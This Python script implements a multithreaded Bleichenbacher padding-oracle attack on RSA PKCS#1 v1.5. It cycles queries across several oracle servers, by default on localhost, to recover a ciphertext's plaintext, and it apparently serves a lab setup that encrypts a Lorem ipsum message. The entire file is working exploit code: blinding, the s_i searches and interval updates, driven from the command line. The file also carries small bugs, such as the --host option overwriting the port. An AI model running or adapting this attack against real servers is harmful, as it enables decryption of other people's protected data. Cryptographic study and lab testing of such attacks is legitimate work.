from Crypto.Util.number import long_to_bytes, bytes_to_long
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from attack.oracle import oracle, init_oracle, KEY_SIZE, ServerClosed
from attack.disjoint_segments import DisjointSegments
from random import randint
from concurrent.futures import ThreadPoolExecutor
from itertools import chain, count, islice, cycle
from typing import Iterator
import sys
import os
import textwrap
import json
import argparse


def ceil_div(x: int, y: int) -> int:
    """
    This function is used to calculate the ceiling division of two numbers.
    """
    return (x + y - 1) // y


def batched(iterable, n: int):
    """Yield successive n-sized batches from the iterable."""
    it = iter(iterable)
    while batch := (islice(it, n)):  # Collect n items at a time
        yield batch


def attack_arguments_parser() -> argparse.Namespace:
    """
    Parses command-line arguments for configuring the Bleichenbacher attack.

    Returns:
        argparse.Namespace: A namespace object containing the parsed arguments.
    """
    parser = argparse.ArgumentParser(
        description="Starts a multithreaded Bleichenbacher attack on a vulnerable server",
        epilog="Try running and see if the attack will decrypt the message in time",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="prints the message as it is being deciphered, (works well when blinding isn't random)",
    )
    parser.add_argument(
        "-r",
        "--random",
        action="store_true",
        help="add this flag if you want the blinding to be random",
    )
    parser.add_argument("-c", "--count", help="number of threads to run, defaults to 5")
    parser.add_argument(
        "-p", "--port", help="sets the server's base port, defaults to 8001"
    )
    parser.add_argument("--host", help="sets the server's host, defaults to localhost")
    my_args = parser.parse_args()
    return my_args


class MultiServerAttacker:
    """
    This class implements the Bleichenbacher attack on an RSA encryption scheme using multiple servers.
    """

    def __init__(
        self,
        N: int,
        E: int,
        ct: int,
        hosts: list[str] | str,
        ports: list[int] | int,
        random_blinding: bool = False,
        verbose: bool = False,
        iteration: int = 1,
    ) -> None:
        """
        Initializes the attacker with necessary parameters like modulus, public exponent, ciphertext,
        server information, and attack configuration.

        Args:
            N (int): The modulus of the RSA public key.
            E (int): The public exponent of the RSA public key.
            ct (int): The ciphertext to attack.
            hosts (list[str] | str): List or single IP address of the server(s).
            ports (list[int] | int): List or single port number(s) of the server(s).
            random_blinding (bool, optional): Whether to start searching for blinding at a random value. Defaults to False.
            verbose (bool, optional): If True, prints progress information. Defaults to False.
            iteration (int, optional): The starting iteration value. Defaults to 1.
        """
        self.N = N
        self.E = E
        self.ct = ct
        self.C = ct
        if isinstance(hosts, str):
            self.hosts = [hosts]
        if isinstance(ports, int):
            self.ports = [ports]
        self.thread_count = len(ports)
        self.conns = [
            init_oracle(host, port) for host, port in zip(hosts, ports, strict=True)
        ]
        self.K = len(long_to_bytes(N))
        self.B = pow(
            2, 8 * (self.K - 2)
        )  # the value of the lsb in the second most significant byte of N
        self.random_blinding = random_blinding
        self.s_list: list[int] = []
        self.M: DisjointSegments = DisjointSegments(
            [range(2 * self.B, 3 * self.B)]
        )  # the set of possible solutions
        self.iteration = iteration
        self.conn_cycler = cycle(self.conns)
        self.last_print = 0
        self.verbose = verbose

    def oracle(self, num: int) -> bool:
        """
        Queries the oracle (server) with a given number and returns the response.
        The oracle is cycled through multiple servers if more than one is provided.

        Args:
            num (int): The number to send to the oracle.

        Returns:
            bool: The result returned by the oracle.
        """
        return oracle(num, next(self.conn_cycler))

    def s_oracle(self, s: int) -> tuple[bool, int]:
        """
        Queries the oracle with a number and returns the result along with the value of s.

        Args:
            s (int): The number to query.

        Returns:
            tuple[bool, int]: The result of the oracle and the value of s.
        """
        return self.oracle(self.C * pow(s, self.E, self.N) % self.N), s

    def blinding(self) -> tuple[int, int]:
        """
        Applies blinding to the ciphertext and finds the corresponding s_i that conforms to the oracle's response.

        Returns:
            tuple[int, int]: The blinded ciphertext and the value of s0.
        """
        start = randint(1, self.N - 1) if self.random_blinding else 1
        s0 = self.find_next_conforming(start)
        self.s0 = s0
        self.s_list.append(s0)
        self.C = self.ct * pow(s0, self.E, self.N) % self.N
        return self.C, s0

    def find_next_conforming(self, start: int, chunk_size: int = 1000) -> int:
        """
        This function is used to search for the next s_i.
        """
        return self.search_iterator(count(start), chunk_size)

    def search_iterator(self, iterator: Iterator, chunk_size: int = 1000) -> int:
        """
        Searches for the next s_i that conforms to the oracle's response starting from a given point.

        Args:
            start (int): The starting point for the search.
            chunk_size (int, optional): The number of queries to send in each batch. Defaults to 1000.

        Returns:
            int: The next s_i that conforms to the oracle.
        """
        if (
            self.iteration <= 10
        ):  # if the iteration is less than 10, use parallel search
            with ThreadPoolExecutor(len(self.conns)) as executor:
                for batch in batched(iterator, chunk_size):
                    results = executor.map(self.s_oracle, batch)
                    for result, query in results:
                        if result:
                            executor.shutdown(cancel_futures=True)
                            return query
        else:  # for the rest of the iterations, parallel search is overkill and the thread creation wastes time
            for query in iterator:
                if self.s_oracle(query)[0]:
                    return query

        raise ValueError("Iterator search failed")  # should never reach here

    def search_start(self, chunk_size: int = 1000) -> int:
        """
        Starts searching for the next s_i when there are multiple intervals in M.

        Args:
            chunk_size (int, optional): The number of queries to process in each batch. Defaults to 1000.

        Returns:
            int: The next s_i found in the search.
        """
        s_i = self.find_next_conforming(self.N // (3 * self.B) + 1, chunk_size)
        self.s_list.append(s_i)
        return s_i

    def search_mulitiple_intervals(self, chunk_size: int = 1000) -> int:
        """
        Searches for the next s_i in the case where there are multiple intervals in M.

        Args:
            chunk_size (int, optional): The number of queries to process in each batch. Defaults to 1000.

        Returns:
            int: The next s_i found in the search.
        """
        s_i = self.find_next_conforming(self.s_list[-1] + 1, chunk_size)
        self.s_list.append(s_i)
        return s_i

    def search_single_interval(self, interval: range, chunk_size: int = 1000) -> int:
        """
        Searches for the next s_i in the case where there is only one interval in M.

        Args:
            interval (range): The current interval of possible solutions.
            chunk_size (int, optional): The number of queries to process in each batch. Defaults to 1000.

        Returns:
            int: The next s_i found in the search.
        """
        a, b = interval.start, interval.stop - 1
        iterator = chain.from_iterable(
            range(
                (2 * self.B + r_i * self.N) // b, ceil_div(3 * self.B + r_i * self.N, a)
            )
            for r_i in count(2 * ceil_div(b * self.s_list[-1] - 2 * self.B, self.N))
        )
        s_i = self.search_iterator(iterator, chunk_size)
        self.s_list.append(s_i)
        return s_i

    # step 2
    def search(self) -> int:
        """
        Searches for the next s_i based on the current intervals in M.

        Returns:
            int: The next s_i found in the search.
        """
        if self.iteration == 1:
            # step 2.a
            return self.search_start()

        elif len(self.M) > 1:
            # step 2.b
            return self.search_mulitiple_intervals()
        else:
            assert len(self.M) == 1
            # step 2.c
            return self.search_single_interval(list(self.M)[0])

    # step 3
    def update_intervals(self, s_i: int) -> DisjointSegments:
        """
        Updates the intervals in M after finding the next s_i.

        Args:
            s_i (int): The next s_i found.

        Returns:
            DisjointSegments: The updated set of intervals in M.
        """
        s_i = s_i % self.N
        M_res = DisjointSegments()
        for interval in self.M:
            a, b = interval.start, interval.stop - 1
            r_range = range(
                ((a * s_i - 3 * self.B + 1) // self.N),
                ((b * s_i - 2 * self.B) // self.N) + 1,
            )
            for r in r_range:
                pos_sol_range = range(
                    max(a, ceil_div(2 * self.B + r * self.N, s_i)),
                    (min(b, (((3 * self.B - 1 + r * self.N) // s_i))) + 1),
                )

                M_res.add(pos_sol_range)
        assert len(M_res) >= 1
        self.M = M_res
        return M_res

    def cyber_print(self, to_print: str, last_print: int):
        """
        Prints the attack progress to the console, updating the screen without overwriting it.

        Args:
            to_print (str): The string to print.
            last_print (int): The number of previous print lines to clear.

        Returns:
            int: The number of rows printed.
        """
        terminal_width = os.get_terminal_size().columns
        wrapped_text = textwrap.wrap(to_print, width=terminal_width)
        num_rows = len(wrapped_text)

        for _ in range(last_print):
            sys.stdout.write("\033[A\033[K")
        sys.stdout.flush()

        for line in wrapped_text:
            print(line)

        return num_rows

    def algo_iteration(self) -> tuple[bool, range]:
        """
        Executes one iteration of the Bleichenbacher attack algorithm, performing a search
        for s_i and updating the intervals in M. If a solution is found, it returns the solution.

        Returns:
            tuple[bool, range]: A tuple indicating whether the solution was found and the current interval range.
        """
        try:
            # step 2
            self.search()
        except ServerClosed:
            return True, self.M.smallest_inclusive()  # ran out of time

        # step 3
        self.update_intervals(self.s_list[-1])

        if self.verbose:
            self.last_print = self.cyber_print(
                f"iteration: {self.iteration}\t\t"
                + str(
                    long_to_bytes(
                        (self.M.tolist()[0].start * pow(self.s0, -1, self.N)) % self.N
                    )
                ),
                self.last_print,
            )

        # step 4
        if len(self.M) == 1:
            M_lst: list[range] = list(iter(self.M))
            if M_lst[0].stop - M_lst[0].start <= 1:
                # answer = M_lst[0].start * pow(self.s_list[0], -1, self.N) % self.N
                return True, M_lst[0]  # found solution

        return False, range(0)

    def attack(self) -> tuple[range, int, int]:
        """
        Executes the Bleichenbacher attack. This method begins by performing blinding,
        then continuously tries to find a solution by iterating through the attack process.

        It repeatedly calls `algo_iteration` to find the next possible solution for the ciphertext.
        The attack continues until a solution is found (i.e., when the oracle server responds with success).

        Returns:
            tuple[range, int, int]:
                - The first element is the range that represents the interval containing the decrypted plaintext.
                - The second element is the blinded value s0.
                - The third element is the final s_i value found in the attack.
        """
        print("started attack")
        self.blinding()
        print("did blinding")
        while True:
            res, ans = self.algo_iteration()
            if res:
                for conn in self.conns:
                    conn.close()

                return ans, self.s0, self.s_list[-1]
            self.iteration += 1


def get_cipher() -> int:
    msg = b"Lorem ipsum dolor sit amet, consectetur adipiscing elit. Praesent quis tortor eget lacus viverra tristique pharetra. "
    with open("public_key.rsa", "rb") as key_file:
        pub_key = RSA.import_key(key_file.read())
    cipher_rsa = PKCS1_v1_5.new(pub_key)

    return bytes_to_long(cipher_rsa.encrypt(msg))


if __name__ == "__main__":
    with open("attack/servers_addr.json", "r") as file:
        params = json.load(file)

    my_args = attack_arguments_parser()

    num_of_threads: int = 5
    if my_args.count and my_args.count.isdecimal():
        num_of_threads = int(my_args.count)

    base_port: int = 8001
    if my_args.port and my_args.port.isdecimal():
        base_port = int(my_args.port)

    host = "localhost"
    if my_args.host:
        base_port = my_args.host

    HOSTS = [host] * num_of_threads
    PORTS = [base_port + i for i in range(num_of_threads)]
    attacker = MultiServerAttacker(
        params["N"],
        params["E"],
        params["C"],
        HOSTS,
        PORTS,
        my_args.random,
        my_args.verbose,
    )

    res_range, s0, si = attacker.attack()
    res = res_range.start
